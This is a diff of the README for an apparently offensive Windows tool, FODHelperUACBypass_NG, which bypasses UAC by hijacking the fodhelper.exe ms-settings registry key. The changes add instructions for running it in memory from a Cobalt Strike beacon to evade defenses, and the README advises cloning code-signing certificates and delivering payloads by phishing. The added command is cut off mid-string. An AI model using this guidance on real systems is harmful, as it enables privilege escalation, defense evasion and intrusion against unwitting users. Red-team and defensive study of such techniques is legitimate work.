@@ -39,7 +39,7 @@ When no arguments are provided, notepad.exe will be used as the default payload 
 .\FODHelperUACBypass_NG\bin\x64\Release\FODHelperUACBypass_NG.exe -test
 ```
 
-> ***NOTE:*** When using your own payload, make sure it is `signed` (or at least has a code signing cerificate `cloned` - ***Carboncopy/SignatureKid*** can do this). Also, ***have it present on the target system before executing the UAC bypass***, as it is the payload that will be executed when the hijacked registry key is triggered by `fodhelper.exe`. In a real attack scenario, the attacker would need to find a way to get the payload onto the target system (e.g. via phishing, file drop, etc.) before executing the UAC bypass.
+> ***NOTE:*** When using your own payload, make sure it is `signed` (or at least has a code signing certificate `cloned` - ***Carboncopy/SignatureKid*** can do this). Also, ***have it present on the target system before executing the UAC bypass***, as it is the payload that will be executed when the hijacked registry key is triggered by `fodhelper.exe`. In a real attack scenario, the attacker would need to find a way to get the payload onto the target system (e.g. via phishing, file drop, etc.) before executing the UAC bypass.
 
 ### Expected Output
 
@@ -57,31 +57,14 @@ When no arguments are provided, notepad.exe will be used as the default payload 
 [+] Operation completed.
 ```
 
-### Diagnostic Tests
+### Using FODHelperUACBypass_NG with inlineExecute-Assembly (Cobalt-Strike).
+
+Since we wrote the code in C# and compiled it as a .Net assembly, we can use it with in-memory execution techniques such as `inlineExecute-Assembly` in Cobalt Strike. This allows us to execute the UAC bypass without writing anything to disk, making it even more stealthy and effective against modern defenses.
+
+From an unprivileged beacon, you can execute the UAC bypass with the following command (make sure to change the path to the assembly and the payload command as needed):
 
 ```powershell
-.\FODHelperUACBypass_NG.exe -test
-```
-
-**Output:**
-```
-[TEST 1] Getting ntdll base address...
-[+] ntdll.dll base: 0x7FFD4DA20000
-
-[TEST 2] Resolving NtClose function...
-[+] NtClose address: 0x7FFD4DB81C20
-
-[TEST 3] Extracting syscall number for NtClose...
-[+] NtClose SSN: 0xF
-
-[TEST 4] Finding syscall instruction for NtClose...
-[+] syscall instruction at: 0x7FFD4DB81C32
-
-[TEST 5] Testing NtDelayExecution (sleep 1 second)...
-[+] Slept for 1005ms
-
-[TEST 6] Testing registry path construction...
-[+] NT path: \Registry\User\S-1-5-21-...\Software\Classes\ms-settings\Shell\Open\command
+inlineExecute-Assembly --dotnetassembly /opt/cobaltstrike/payloads/FODHelperUACBypass_NG.exe --assemblyargs "notepad.exe
 ```
 
 ---
